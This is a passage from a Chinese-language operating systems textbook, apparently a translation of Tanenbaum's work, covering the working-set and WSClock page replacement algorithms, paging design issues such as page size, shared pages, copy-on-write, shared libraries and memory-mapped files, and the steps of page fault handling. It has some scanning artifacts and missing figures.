根据LRU, 如果必须置换一个页面，则应该 在这两个页面中选择一个。
然而现在的问题是，我们不知道在时钟滴答1到时钟滴答2期间它们中的哪一 个页面是后被访问到的。
因为在每个时钟滴答中只记录了一位，所以无法区分在一个时钟滴答中哪个页 面在较早的时间被访问以及哪个页面在较晚的时间被访问，因此，我们所能做的就是置换页面3,原因 是页面5在更往前的两个时钟滴答中也被访问过而页面3没有。
LRU 和老化算法的第二个区别是老化算法的计数器只有有限位数(本例中是8位),这就限制了其对 以往页面的记录。
如果两个页面的计数器都是0,我们只能在两个页面中随机选一个进行置换。
实际上， 有可能其中一个页面上次被访问是在9个时钟滴答以前，另一个页面是在1000个时钟滴答以前，而我们
却无法看到这些。
在实践中，如果时钟滴答是20ms,8 位一般是够用的。
假如一个页面已经有160ms没 有被访问过，那么它很可能并不重要。
3.4.8 工作集页面置换算法
在单纯的分页系统里，刚启动进程时，在内存中并没有页面。
在CPU试图取第一条指令时就会产生一 次缺页中断，使操作系统装入含有第一条指令的页面。
其他由访问全局数据和堆栈引起的缺页中断通常会 紧接着发生。
一段时间以后，进程需要的大部分页面都已经在内存了，进程开始在较少缺页中断的情况下 运行。
这个策略称为请求调页(demand paging),因为页面是在需要时被调入的，而不是预先装入。
编写一个测试程序很容易，在一个大的地址空间中系统地读所有的页面，将出现大量的缺页中断， 因此会导致没有足够的内存来容纳这些页面。
不过幸运的是，大部分进程不是这样工作的，它们都表现 出了一种局部性访问行为，即在进程运行的任何阶段，它都只访问较少的一部分页面。
例如，在一个多 次扫描编译器中，各次扫描时只访问所有页面中的一小部分，并且是不同的部分。
一个进程当前正在使用的页面的集合称为它的工作集 (Denning,1968a;Denning,1 980)。
如 果 整 个工作集都被装入到了内存中，那么进程在运行到下一运行阶段(例如，编译器的下一遍扫描)之前， 不会产生很多缺页中断。
若内存太小而无法容纳下整个工作集，那么进程的运行过程中会产生大量的缺 页中断，导致运行速度也会变得很缓慢，因为通常只需要几个纳秒就能执行完一条指令，而通常需要十 毫秒才能从磁盘上读入一个页面。
如果一个程序每10ms 只能执行一到两条指令，那么它将会需要很长时 间才能运行完。
若每执行几条指令程序就发生一次缺页中断，那么就称这个程序发生了颠 簸 (Denning, 1968b)。
在多道程序设计系统中，经常会把进程转移到磁盘上(即从内存中移走所有的页面),这样可以让 其他的进程有机会占有CPU。
有一个问题是，当该进程再次调回来以后应该怎样办?
从技术的角度上讲， 并不需要做什么。
该进程会一直产生缺页中断直到它的工作集全部被装入内存。
然而，每次装入一个进 程时都要产生20、100甚至1000次缺页中断，速度显然太慢了，并且由于CPU需要几毫秒时间处理一个 缺页中断，因此有相当多的CPU时间也被浪费了。
所以不少分页系统都会设法跟踪进程的工作集，以确保在让进程运行以前，它的工作集就已在内存 中了。
该方法称为工作集模型 (Denning,1970), 其目的在于大大减少缺页中断率。
在进程运行前预先 装入其工作集页面也称为预先调页 ( prepaging) 。
请注意工作集是随着时间变化的。
人们很早就发现大多数程序都不是均匀地访问它们的地址空间的，而访问往往是集中于一小部分页 面。
一次内存访问可能会取出一条指令，也可能会取数据，或者是存储数据。
在任一时刻t, 都存在一 个集合，它包含所有最近k次内存访问所访问过的页面。
这个集合w(k,t)就是工作集。
因为最近k=1 次访
问肯定会访问最近k>1次访问所访问过的页面， 所以w(k,t) 是k的单调非递减函数。
随着k的变大， w(k,1)是不会无限变大的，因为程序不可能访问比 它的地址空间所能容纳的页面数目上限还多的页 面，并且几乎没有程序会使用每个页面。
图3-18 描述了作为k的函数的工作集的大小。
事实上大多数程序会任意访问一小部分页 面，但是这个集合会随着时间而缓慢变化，这个 事实也解释了为什么一开始曲线快速地上升而k较 大时上升会变慢。
举例来说，某个程序执行占用
图3-18 工作集是最近k次内存访问所访问过的页面的 集合，函数w(k,t)是在时刻工作集的大小
了两个页面的循环，并使用四个页面上的数据，那么可能每执行1000条指令，它就会访问这六个页面一 次，但是最近的对其他页面的访问可能是在100万条指令以前的初始化阶段。
因为这是个渐进的过程，k 值的选择对工作集的内容影响不大。
换句话说，k的值有一个很大的范围，它处在这个范围中时工作集 不会变。
因为工作集随时间变化很慢，那么当程序重新开始时，就有可能根据它上次结束时的工作集对 要用到的页面做一个合理的推测，预先调页就是在程序继续运行之前预先装入推测出的工作集的页面。
为了实现工作集模型，操作系统必须跟踪哪些页面在工作集中。
通过这些信息可以直接推导出一个
合理的页面置换算法：当发生缺页中断时，淘汰一个不在工作集中的页面。
为了实现该算法，就需要一 种精确的方法来确定哪些页面在工作集中。
根据定义，工作集就是最近k次内存访问所使用过的页面的集 合(有些设计者使用最近k次页面访问，但是选择是任意的)。
为了实现工作集算法，必须预先选定k的值。
一旦选定某个值，每次内存访问之后，最近k次内存访问所使用过的页面的集合就是唯一确定的了。
当然，有了工作集的定义并不意味着存在一种有效的方法能够在程序运行期间及时地计算出工作集。
设想有一个长度为k的移位寄存器，每进行一次内存访问就把寄存器左移一位，然后在最右端插入刚才 所访问过的页面号。
移位寄存器中的k个页面号的集合就是工作集。
理论上，当缺页中断发生时，只要 读出移位寄存器中的内容并排序；然后删除重复的页面。
结果就是工作集。
然而，维护移位寄存器并在 缺页中断时处理它所需的开销很大，因此该技术从来没有被使用过。
作为替代，可以使用几种近似的方法。
一种常见的近似方法就是，不是向后找最近k次的内存访问， 而是考虑其执行时间。
例如，按照以前的方法，定义工作集为前1000万次内存访问所使用过的页面的集 合，那么现在就可以这样定义：工作集即是过去10ms中的内存访问所用到的页面的集合。
实际上，这样 的模型很合适且更容易实现。
要注意到，每个进程只计算它自己的执行时间。
因此，如果一个进程在T 时刻开始，在 (T+100)ms 的时刻使用了40ms CPU时间，对工作集而言，它的时间就是40ms。
一个进 程从它开始执行到当前所实际使用的CPU时间总数通常称作当前实际运行时间。
通过这个近似的方法， 进程的工作集可以被称为在过去的t 秒实际运行时间中它所访问过的页面的集合。
现在让我们来看一下基于工作集的页面置换算法。
基本思路就是找出一个不在工作集中的页面并淘 汰它。
在图3-19中读者可以看到某台机器的部分页表。
因为只有那些在内存中的页面才可以作为候选者 被淘汰，所以该算法忽略了那些不在内存中的页面。
每个表项至少包含两条信息：上次使用该页面的近 似时间和R (访问)位。
空白的矩形表示该算法不需要的其他域，如页框号、保护位、M (修改)位。
页表
图3-19 工作集算法
该算法工作方式如下。
如前所述，假定使用硬件来置R位和M位。
同样，假定在每个时钟滴答中， 有一个定期的时钟中断会用软件方法来清除R位。
每当缺页中断发生时，扫描页表以找出一个合适的页 面淘汰之 。
在处理每个表项时，都需要检查R位。
如果它是1,就把当前实际时间写进页表项的“上次使用时 间”域，以表示缺页中断发生时该页面正在被使用。
既然该页面在当前时钟滴答中已经被访问过，那么 很明显它应该出现在工作集中，并且不应该被删除(假定t 横跨多个时钟滴答)。
如果R是0,那么表示在当前时钟滴答中，该页面还没有被访问过，则它就可以作为候选者被置换。
为了知道它是否应该被置换，需要计算它的生存时间(即当前实际运行时间减去上次使用时间),然后 与z 做比较。
如果它的生存时间大于t, 那么这个页面就不再在工作集中，而用新的页面置换它。
扫描会 继续进行以更新剩余的表项。
然而，如果R是0同时生存时间小于或等于t, 则该页面仍然在工作集中。
这样就要把该页面临时保 留下来，但是要记录生存时间最长(“上次使用时间”的最小值)的页面。
如果扫描完整个页表却没有 找到适合被淘汰的页面，也就意味着所有的页面都在工作集中。
在这种情况下，如果找到了一个或者多 个R=0 的页面，就淘汰生存时间最长的页面。
在最坏情况下，在当前时间滴答中，所有的页面都被访问 过了(也就是都有R=1), 因此就随机选择一个页面淘汰，如果有的话最好选一个干净页面。
3.4.9 工作集时钟页面置换算法
当缺页中断发生后，需要扫描整个页表才能确定被淘汰的页面，因此基本工作集算法是比较费时的。
有一种改进的算法，它基于时钟算法，并且使用了工作集信息，称为WSClock (工作集时钟)算法 (Carr 和Hennessey,1981) 。
由于它实现简单，性能较好，所以在实际工作中得到了广泛应用。
c) d)
图3-20 工作集时钟页面置换算法的操作：a) 和b) 给出在R=1时所发生的情形；c) 和d) 给出R=0的例子
与时钟算法一样，每次缺页中断时，首先检查指针指向的页面。
如果R位被置为1,该页面在当前 时钟滴答中就被使用过，那么该页面就不适合被淘汰。
然后把该页面的R位置为0,指针指向下一个页面， 并重复该算法。
该事件序列之后的状态参见图3-20b。
现在来考虑指针指向的页面在R=0时会发生什么,参见图3-20c。
如果页面的生存时间大于t 饼且该 页面是干净的，它就不在工作集中，并且在磁盘上有一个有效的副本。
申请此页框，并把新页面放在其 中，如图3-20d所示。
另一方面，如果此页面被修改过，就不能立即申请页框，因为这个页面在磁盘上 没有有效的副本。
为了避免由于调度写磁盘操作引起的进程切换，指针继续向前走，算法继续对下一个 页面进行操作。
毕竟，有可能存在一个旧的且干净的页面可以立即使用。
原则上，所有的页面都有可能因为磁盘I/O 在某个时钟周期被调度。
为了降低磁盘阻塞，需要设置 一个限制，即最大只允许写回n个页面。
一旦达到该限制，就不允许调度新的写操作。
如 果 指 针 经 过 一 圈 返 回 它 的 起 始 点 会 发 生 什 么 呢 ?
这 里 有 两 种 情 况 ：
1)至少调度了一次写操作。
2)没有调度过写操作。
对于第一种情况，指针仅仅是不停地移动，寻找一个干净页面。
既然已经调度了一个或者多个写操 作，最终会有某个写操作完成，它的页面会被标记为干净。
置换遇到的第一个干净页面，这个页面不一 定是第一个被调度写操作的页面，因为硬盘驱动程序为了优化性能可能已经把写操作重排序了。
对于第二种情况，所有的页面都在工作集中，否则将至少调度了一个写操作。
由于缺乏额外的信息， 一个简单的方法就是随便置换一个干净的页面来使用，扫描中需要记录干净页面的位置。
如果不存在干 净页面，就选定当前页面并把它写回磁盘。
3.4.10 页面置换算法小结
我们已经考察了多种页面置换算法，本节将对这些算法进行总结。
已经讨论过的算法在图3-21中列出。
最优算法在当前页面中置换最后要访问到的页面。
不幸的是，没有办法来判定哪个页面是最后一个 要访问的，因此实际上该算法不能使用。
然而，它可以作为衡量其他算法的基准。
NRU算法根据R位和M位的状态把页面分为四类。
从编号最小的类中随机选择一个页面置换。
该算 法易于实现，但是性能不是很好，还存在更好的算法。
图3-21 本书中讨论过的页面置换算法
FIFO 算法通过维护一个页面的链表来记录它们装入内存的顺序。
淘汰的是最老的页面，但是该页 面可能仍在使用，因此FIFO算法不是一个好的选择。
第二次机会算法是对FIFO 算法的改进，它在移出页面前先检查该页面是否正在被使用。
如果该页 面正在被使用，就保留该页面。
这个改进大大提高了性能。
时钟算法是第二次机会算法的另一种实现。
它具有相同的性能特征，而且只需要更少的执行时间。
LRU算法是一种非常优秀的算法，但是只能通过特定的硬件来实现。
如果机器中没有该硬件，那么 也无法使用该算法。
NFU 是一种近似于LRU的算法，它的性能不是非常好，然而，老化算法更近似于 LRU并且可以更有效地实现，是一个很好的选择。
最后两种算法都使用了工作集。
工作集算法有合理的性能，但它的实现开销较大。
工作集时钟算法 是它的一种变体，不仅具有良好的性能，并且还能高效地实现。
总之，最好的两种算法是老化算法和工作集时钟算法，它们分别基于LRU和工作集。
它们都具有良好 的页面调度性能，可以有效地实现。
也存在其他一些算法，但在实际应用中，这两种算法可能是最重要的。
3.5 分页系统中的设计问题
在前几节里我们讨论了分页系统是如何工作的，并给出了一些基本的页面置换算法和如何实现它们。
然而只了解基本机制是不够的。
要设计一个系统，必须了解得更多才能使系统工作得更好。
这两者之间 的差别就像知道了怎样移动象棋的各种棋子与成为一个好棋手之间的差别。
下面将讨论为了使分页系统 达到较好的性能，操作系统设计者必须仔细考虑的一些其他问题。
3.5.1 局部分配策略与全局分配策略
在前几节中，我们讨论了在发生缺页中断时用来选择一个被置换页面的几个算法。
与这个选择相关
的一个主要问题(到目前为止我们一直在小心地回避这个问题)是，怎样在相互竞争的可运行进程之间 分配内存。
如图3-22a所示，三个进程A 、B 、C 构成了可运行进程的集合。
假如A发生了缺页中断，页面置换 算法在寻找最近最少使用的页面时是只考虑分配给A的6个页面呢?
还是考虑所有在内存中的页面?
如果 只考虑分配给A的页面，生存时间值最小的页面是A5, 于是将得到图3-22b所示的状态。
生存时间
b)
图3-22 局部页面置换与全局页面置换：a) 最初配置；b) 局部页面置换；c) 全局页面置换
另一方面，如果淘汰内存中生存时间值最小的页面，而不管它属于哪个进程，则将选中页面B3, 于是将得到图3-22c所示的情况。
图3-22b的算法被称为局部 (loca l) 页面置换算法，而图3-22c被称为全 局 (global) 页面置换算法。
局部算法可以有效地为每个进程分配固定的内存片段。
全局算法在可运行 进程之间动态地分配页框，因此分配给各个进程的页框数是随时间变化的。
另一种途径是使用一个为进程分配页框的算法。
其中一种方法是定期确定进程运行的数目并为它们 分配相等的份额。
例如，在有12416个有效(即未被操作系统使用的)页框和10个进程时，每个进程将 获得1241个页框，剩下的6个被放入一个公用池中，当发生缺页中断时可以使用这些页面。
这个算法看起来好像很公平，但是给一个10KB的进程和一个300KB的进程分配同样大小的内存块 是很不合理的。
可以采用按照进程大小的比例来为它们分配相应数目的页面的方法来取代上一种方法， 这样300KB的进程将得到10KB进程30倍的份额。
比较明智的一个可行的做法是对每个进程都规定一个 最小的页框数，这样不论多么小的进程都可以运行。
例如，在某些机器上， 一条两个操作数的指令会需 要多达6个页面，因为指令自身、源操作数和目的操作数可能会跨越页面边界，若只给一条这样的指令 分配了5个页面，则包含这样的指令的程序根本无法运行。
况下，可能会从该进程的资源中剥夺部分页框。
这样，PFF 的范围内。
值得注意的是，一些页面置换算法既适用于局部 置换算法，又适用于全局置换算法。
例如，FIFO 能 够将所有内存中最老的页面置换掉(全局算法),也 能将当前进程的页面中最老的替换掉(局部算法)。
相似地，LRU或是一些类似算法能够将所有内存中最 近最少访问的页面替换掉(全局算法),或是将当前 进程中最近最少使用的页面替换掉(局部算法)。
在 某些情况下，选择局部策略还是全局策略是与页面置 换算法无关的。
另一方面，对于其他的页面置换算法，只有采用局部策略才有意义。
特别是工作集和WSClock 算法 是针对某些特定进程的而且必须应用在这些进程的上下文中。
实际上没有针对整个机器的工作集，并且 试图使用所有工作集的并集作为机器的工作集可能会丢失一些局部特性，这样算法就不能达到好的性能。
3.5.2 负载控制
即使是使用最优页面置换算法并对进程采用理想的全局页框分配，系统也可能会发生颠簸。
事实上， 一旦所有进程的组合工作集超出了内存容量，就可能发生颠簸。
该现象的症状之一就是如PFF算法所指出的， 一些进程需要更多的内存，但是没有进程需要更少的内存。
在这种情况下，没有方法能够在不影响其他进 程的情况下满足那些需要更多内存的进程的需要。
唯一现实的解决方案就是暂时从内存中去掉一些进程。
减少竞争内存的进程数的一个好方法是将一部分进程交换到磁盘，并释放他们所占有的所有页面。
例如，一个进程可以被交换到磁盘，而它的页框可以被其他处于颠簸状态的进程分享。
如果颠簸停止，系 统就能够这样运行一段时间。
如果颠簸没有结束，需要继续将其他进程交换出去，直到颠簸结束。
因此， 即使是使用分页，交换也是需要的，只是现在交换是用来减少对内存潜在的需求，而不是收回它的页面。
将进程交换出去以减轻内存需求的压力是借用了两级调度的思想，在此过程中一些进程被放到磁盘，此 时用一个短期的调度程序来调度剩余的进程。
很明显，这两种思路可以被组合起来，将恰好足够的进程交换 出去以获取可接受的缺页中断率。
一些进程被周期性地从磁盘调入，而其他一些则被周期性地交换到磁盘。
不过，另一个需要考虑的因素是多道程序设计的道数。
当内存中的进程数过低的时候，CPU 可能在 很长的时间内处于空闲状态。
考虑到该因素，在决定交换出哪个进程时不光要考虑进程大小和分页率， 还要考虑它的特性(如它究竟是CPU 密集型还是I/O 密集型)以及其他进程的特性。
3.5.3 页面大小
页面大小是操作系统可以选择的一个参数。
例如，即使硬件设计只支持4096字节的页面，操作系统 也可以很容易通过总是为页面对0和1、2和3、4和5等分配两个连续的8192字节的页框，而将其作为8KB 的页面。
要确定最佳的页面大小需要在几个互相矛盾的因素之间进行权衡。
从结果看，不存在全局最优。
首 先，有两个因素可以作为选择小页面的理由。
随便选择一个正文段、数据段或堆栈段很可能不会恰好装 满整数个页面，平均的情况下，最后一个页面中有一半是空的。
多余的空间就被浪费掉了，这种浪费称 为内部碎片 (internal fragmentation)。
在内存中有n个段、页面大小为p字节时，会有np/2 字节被内部碎 片浪费。
从这方面考虑，使用小页面更好。
选择小页面还有一个明显的好处，考虑一个程序，它分成8个阶段顺序执行，每阶段需要4KB内存。
如果页面大小是32KB, 那就必须始终给程序分配32KB内存。
如果页面大小是16KB, 它就只需要16KB 。
如果页面大小是4KB或更小，那么在任何时刻它只需要4KB内存。
总的来说，大尺寸页面比小尺寸页面 浪费了更多内存。
另一方面，页面小意味着程序需要更多的页面，这又意味着需要更大的页表。
一个32KB的程序只 需要4个8KB的页面，却需要64个512字节的页面。
内存与磁盘之间的传输一般是一次一页，传输中的大 部分时间都花在了寻道和旋转延迟上，所以传输一个小页面所用的时间和传输一个大页面基本上是相同
的。
装入64个512字节的页面可能需要64×10ms, 而装入4个8KB的页面可能只需要4×12ms。
此外，小页面能够更充分地利用TLB 空间。
假设程序使用的内存为1MB, 工作单元为64KB。
若 使 用4KB的页，则程序将至少占用TLB中的16个表项；而使用2MB的页时，1个TLB 表项就足够了(理论 上，你还可以将数据和指令分离开来)。
由于TLB 表项相对稀缺，且对于性能而言至关重要，因此在条 件允许的情况下使用大页面是值得的。
为了进行必要的平衡，操作系统有时会为系统中的不同部分使用 不同的页面大小。
例如，内核使用大页面，而用户进程则使用小页面。
在某些机器上，每次CPU从一个进程切换到另一个进程时都必须把新进程的页表装入硬件寄存器中。
这样，页面越小意味着装入页面寄存器花费的时间就会越长，而且页表占用的空间也会随着页面的减小 而增大。
最后一点可以从数学上进行分析，假设进程平均大小是s个字节，页面大小是p个字节，每个页表项 需要e个字节。
那么每个进程需要的页数大约是s/p, 占用了se/p 个字节的页表空间。
内部碎片在最后一 页浪费的内存是p/2 。
因此，由页表和内部碎片损失造成的全部开销是以下两项之和：
开销=se /p+p/2
在页面比较小的时候，第一项(页表大小)大。
在页面比较大时第二项(内部碎片)大。
最优值一 定在页面大小处于中间的某个值时取得，通过对p一次求导并令右边等于零，得到方程：
-se /p²+1/2=0
从这个方程可以得出最优页面大小的公式(只考虑碎片浪费和页表所需的内存),结果是：
P=√2se
对于s=1MB 和每个页表项e=8B, 最优页面大小是4KB。
商用计算机使用的页面大小一般在512B
到64KB之间，以前的典型值是1KB, 而现在更常见的页面大小是4 KB或8KB。
3.5.4 分离的指令空间和数据空间
大多数计算机只有一个地址空间，既存放程序也存放数据，如图3-24a所示。
如果地址空间足够大， 那么一切都好。
然而，地址空间通常太小了，这就使得程序员对地址空间的使用出现困难。
图3-24 a) 单个地址空间；b) 分离的I空间和D空间
首先在PDP-11(16 位)上实现的一种解决方案是，为指令(程序正文)和数据设置分离的地址空 间，分别称为I空间和D 空间，如图3-24b所示。
每个地址空间都从0开始到某个最大值，比较有代表性的 是2¹⁶-1或者2³²-1。
链接器必须知道何时使用分离的I空间和D空间，因为当使用它们时，数据被重定位 到虚拟地址0,而不是在程序之后开始。
尽管现在的地址空间已经很大，但其大小曾是一个很严重的问题。
即便是在今天把地址空间划分成 I 和D层也很常见。
现在的地址空间经常被划分到一级缓存里，而不再分给常规的地址空间。
毕竟在一级 缓存中，内存也是个稀缺品。
3.5.5 共享页面
另一个设计问题是共享。
在大型多道程序设计系统中，几个不同的用户同时运行同一个程序是很常
见的。
显然，由于避免了在内存中有一个页 面的两份副本，共享页面效率更高。
这里存 在一个问题，即并不是所有的页面都适合共 享。
特别地，那些只读的页面(诸如程序文 本)可以共享，但是数据页面则不能共享。
如果系统支持分离的I空间和D空间，那
么让两个或者多个进程来共享程序就变得非
常简单了，这些进程使用相同的I 空间页表和
不同的D空间页表。
在一个比较典型的使用这
种方式来支持共享的实现中，页表与进程表
数据结构无关。
每个进程在它的进程表中都
有两个指针：一个指向I空间页表，一个指向
D空间页表，如图3-25所示。
当调度程序选择
一个进程运行时，它使用这些指针来定位合
适的页表，并使用它们来设立MMU。
即使没
有分离的I空间和D空间，进程也可以共享程
序(或者有时为库),但要使用更为复杂的机制。
在两个或更多进程共享某些代码时，在共享页面上存在一个问题。
假设进程A和进程B同时运行一 个编辑器并共享页面。
如果调度程序决定从内存中移走A, 撤销其所有的页面并用一个其他程序来填充 这些空的页框，则会引起B产生大量的缺页中断，才能把这些页面重新调入。
类似地，当进程A结束时，能够发现这些页面仍然在被使用是非常必要的，这样，这些页面的磁盘 空间才不会被随意释放。
查找所有的页表，考察一个页面是否共享，其代价通常比较大，所以需要专门 的数据结构记录共享页面，特别地，如果共享的单元是单个页面(或一批页面),而不是整个页表。
共享数据要比共享代码麻烦，但也不是不可能。
特别是在UNIX 中，在进行fork 系统调用后，父进 程和子进程要共享程序文本和数据。
在分页系统中，通常是让这些进程分别拥有它们自己的页表，但都 指向同一个页面集合。
这样在执行fork 调用时就不需要进行页面复制。
然而，所有映射到两个进程的数 据页面都是只读的。
只要这两个进程都仅仅是读数据，而不做更改，这种情况就可以保持下去。
但只要有一个进程更新 了一点数据，就会触发只读保护，并引发操作系统陷阱。
然后会生成一个该页的副本，这样每个进程都 有自己的专用副本。
两个复制都是可以读写的，随后对任何一个副本的写操作都不会再引发陷阱。
这种 策略意味着那些从来不会执行写操作的页面(包括所有程序页面)是不需要复制的，只有实际修改的数 据页面需要复制。
这种方法称为写时复制，它通过减少复制而提高了性能。
3.5.6 共享库
可以使用其他的粒度取代单个页面来实现共享。
如果一个程序被启动两次，大多数操作系统会自动 共享所有的代码页面，而在内存中只保留一份代码页面的副本。
代码页面总是只读的，因此这样做不存 在任何问题。
依赖于不同的操作系统，每个进程都拥有一份数据页面的私有副本，或者这些数据页面被 共享并且被标记为只读。
如果任何一个进程对一个数据页面进行修改，系统就会为此进程复制这个数据 页面的一个副本，并且这个副本是此进程私有的，也就是说会执行“写时复制”。
Id*.o-Ic -Im
不过，共享库带来了一个必须解决的小问题，如图3-26所示。
我们看到有两个进程共享一个20KB 大小的库(假设每一方框为4KB)。
但是，这个库被不同的进程定位在不同的地址上，大概是因为程序 本身的大小不相同。
在进程1中，库从地址36K开始；在进程2中则从地址12K开始。
假设库中第一个函 数要做的第一件事就是跳转到库的地址16。
如果这个库没有被共享，它可以在装载的过程中重定位，就 会跳转(在进程1中)到虚拟地址的36K+16 。
注意，库被装载到的物理地址与这个库是否为共享库是没 有任何关系的，因为所有的页面都被MMU硬件从虚拟地址映射到了物理地址。
进程1 RAM 进程2
图3-26 两个进程使用的共享库
但是，由于库是共享的，因此在装载时再进行重定位就行不通了。
毕竟，当进程2调用第一个函数 时(在地址12K), 跳转指令需要跳转到地址12K+16, 而不是地址36K+16。
这就是那个必须解决的小问 题。
解决它的一个办法是写时复制，并为每一个共享这个库的进程创建新页面，在创建新页面的过程中 进行重定位。
当然，这样做和使用共享库的目的相悖。
一个更好的解决方法是：在编译共享库时，用一个特殊的编译选项告知编译器，不要产生使用绝对 地址的指令。
相反，只能产生使用相对地址的指令。
例如，几乎总是使用向前(或向后)跳转n个字节 (与给出具体跳转地址的指令不同)的指令。
不论共享库被放置在虚拟地址空间的什么位置，这种指令
都可以正确工作。
通过避免使用绝对地址，这个问题就可以被解决。
只使用相对偏移量的代码被称作位 置无关代码 (position-independent code)。
3.5.7 内存映射文件
共享库实际上是一种更为通用的机制——内存映射文件 (memor y-mapped file) 的一个特例。
这种 机制的思想是：进程可以通过发起一个系统调用，将一个文件映射到其虚拟地址空间的一部分。
在多数 实现中，在映射共享的页面时不会实际读入页面的内容，而是在访问页面时才会被每次一页地读入，磁 盘文件则被当作后备存储。
当进程退出或显式地解除文件映射时，所有被改动的页面会被写回到磁盘文 件 中 。
如果两个或两个以上的进程同时映射了同一个文件，它们就可以通过共享内存来通信。
一个进程在 共享内存上完成了写操作，此刻当另一个进程在映射到这个文件的虚拟地址空间上执行读操作时，它就 可以立刻看到上一个进程写操作的结果。
因此，这个机制提供了一个进程之间的高带宽通道，而且这种 应用很普遍(甚至扩展到用来映射无名的临时文件)。
很显然，如果内存映射文件可用，共享库就可以 使用这个机制。
3.5.8 清除策略
如果发生缺页中断时系统中有大量的空闲页框，此时分页系统工作在最佳状态。
如果每个页框都被 占用，而且被修改过的话，再换入一个新页面时，旧页面应首先被写回磁盘。
为保证有足够的空闲页框， 很多分页系统有一个称为分页守护进程 (pa ging daemon)的后台进程，它在大多数时候睡眠，但定期 被唤醒以检查内存的状态。
如果空闲页框过少，分页守护进程通过预定的页面置换算法选择页面换出内 存。
如果这些页面装入内存后被修改过，则将它们写回磁盘。
在任何情况下，页面中原先的内容都被记录下来。
当需要使用一个已被淘汰的页面时，如果该页框 还没有被覆盖，将其从空闲页框缓冲池中移出即可恢复该页面。
保存一定数目的页框供给比使用所有内 存并在需要时搜索一个页框有更好的性能。
分页守护进程至少保证了所有的空闲页框是“干净”的，所 以空闲页框在被分配时不必再急着写回磁盘。
3.5.9 虚拟内存接口
到现在为止，所有的讨论都假定虚拟内存对进程和程序员来说是透明的，也就是说，它们都可以在 一台只有较少物理内存的计算机上看到很大的虚拟地址空间。
对于不少系统而言这样做是对的，但对于 一些高级系统而言，程序员可以对内存映射进行控制，并可以通过非常规的方法来增强程序的行为。
这 一节将简短地讨论一下这些问题。
允许程序员对内存映射进行控制的一个原因就是为了允许两个或者多个进程共享同一部分内存。
如 果程序员可以对内存区域进行命名，那么就有可能实现共享内存：通过让一个进程把一片内存区域的名 称通知另一个进程，而使得第二个进程可以把这片区域映射到它的虚拟地址空间中去。
通过两个进程 (或者更多)共享同一部分页面，高带宽的共享就成为可能—一个进程往共享内存中写内容而另一个 从中读出内容。
De Bruijn(2011)描述了通信信道这种复杂例子。
页面共享也可以用来实现高性能的消息传递系统。
一般地，传递消息的时候，数据被从一个地址空 间复制到另一个地址空间，开销很大。
如果进程可以控制它们的页面映射，就可以这样来发送一条消息： 发送进程清除那些包含消息的页面的映射，而接收进程把它们映射进来。
这里只需要复制页面的名字， 而不需要复制所有数据。
另外一种高级存储管理技术是分布式共享内存 (Feeley 等人，1995; Li,1986;Li 和 Hudak,
1989;Zekauskas 等人，1994)。
该方法允许网络上的多个进程共享一个页面集合，这些页面可能(而不 是必要的)作为单个的线性共享地址空间。
当一个进程访问当前还没有映射进来的页面时，就会产生缺 页中断。
在内核空间或者用户空间中的缺页中断处理程序就会对拥有该页面的机器进行定位，并向它发 送一条消息，请求它清除该页面的映射，并通过网络发送出来。
当页面到达时，就把它映射进来，并重 新开始运行引起缺页中断的指令。
在第8章中我们将详细讨论分布式共享内存。
3.6 有关实现的问题
实现虚拟内存系统要在主要的理论算法(如第二次机会算法与老化算法，局部页面分配与全局页面 分配，请求调页与预先调页)之间进行选择。
但同时也要注意一系列实际的实现问题。
在这一节中将涉 及一些通常情况下会遇到的问题以及一些解决方案。
3.6.1 与分页有关的工作
操作系统要在下面的四段时间里做与分页相关的工作：进程创建时，进程执行时，缺页中断时和进 程终止时。
下面将分别对这四个时期进行简短的分析。
当在分页系统中创建一个新进程时，操作系统要确定程序和数据在初始时有多大，并为它们创建一 个页表。
操作系统还要在内存中为页表分配空间并对其进行初始化。
当进程被换出时，页表不需要驻留在 内存中，但当进程运行时，它必须在内存中。
另外，操作系统要在磁盘交换区中分配空间，以便在一个进 程换出时在磁盘上有放置此进程的空间。
操作系统还要用程序正文和数据对交换区进行初始化，这样当新 进程发生缺页中断时，可以调入需要的页面。
某些系统直接从磁盘上的可执行文件对程序正文进行分页， 以节省磁盘空间和初始化时间。
最后，操作系统必须把有关页表和磁盘交换区的信息存储在进程表中。
当调度一个进程执行时，必须为新进程重置MMU, 刷新TLB, 以清除以前的进程遗留的痕迹。
新 进程的页表必须成为当前页表，通常可以通过复制该页表或者把一个指向它的指针放进某个硬件寄存器 来完成。
有时，在进程初始化时可以把进程的部分或者全部页面装入内存中以减少缺页中断的发生，例 如 ，PC (程序计数器)所指的页面肯定是需要的。
当缺页中断发生时，操作系统必须通过读硬件寄存器来确定是哪个虚拟地址造成了缺页中断。
通过 该信息，它要计算需要哪个页面，并在磁盘上对该页面进行定位。
它必须找到合适的页框来存放新页面， 必要时还要置换老的页面，然后把所需的页面读入页框。
最后，还要回退程序计数器，使程序计数器指 向引起缺页中断的指令，并重新执行该指令。
当进程退出的时候，操作系统必须释放进程的页表、页面和页面在硬盘上所占用的空间。
如果某些 页面是与其他进程共享的，当最后一个使用它们的进程终止的时候，才可以释放内存和磁盘上的页面。
3.6.2 缺页中断处理
现在终于可以讨论缺页中断发生的细节了。
缺页中断发生时的事件顺序如下：
1)硬件陷入内核，在堆栈中保存程序计数器。
大多数机器将当前指令的各种状态信息保存在特殊的 CPU寄存器中。
2)启动一个汇编代码例程保存通用寄存器和其他易失的信息，以免被操作系统破坏。
这个例程将操 作系统作为一个函数来调用。
3)当操作系统发现一个缺页中断时，尝试发现需要哪个虚拟页面。
通常一个硬件寄存器包含了这一 信息，如果没有的话，操作系统必须检索程序计数器，取出这条指令，用软件分析这条指令，看看它在 缺页中断时正在做什么。
4)一旦知道了发生缺页中断的虚拟地址，操作系统检查这个地址是否有效，并检查存取与保护是否 一致。
如果不一致，向进程发出一个信号或杀掉该进程。
如果地址有效且没有保护错误发生，系统则检 查是否有空闲页框。
如果没有空闲页框，执行页面置换算法寻找一个页面来淘汰。
5)如果选择的页框“脏”了，安排该页写回磁盘，并发生一次上下文切换，挂起产生缺页中断的进 程，让其他进程运行直至磁盘传输结束。
无论如何，该页框被标记为忙，以免因为其他原因而被其他进 程占用。
6)一旦页框“干净”后(无论是立刻还是在写回磁盘后),操作系统查找所需页面在磁盘上的地址，
通过磁盘操作将其装入。
该页面正在被装入时，产生缺页中断的进程仍然被挂起，并且如果有其他可运 行的用户进程，则选择另一个用户进程运行。
7)当磁盘中断发生时，表明该页已经被装入，页表已经更新可以反映它的位置，页框也被标记为正 常状态。
8)恢复发生缺页中断指令以前的状态，程序计数器重新指向这条指令。
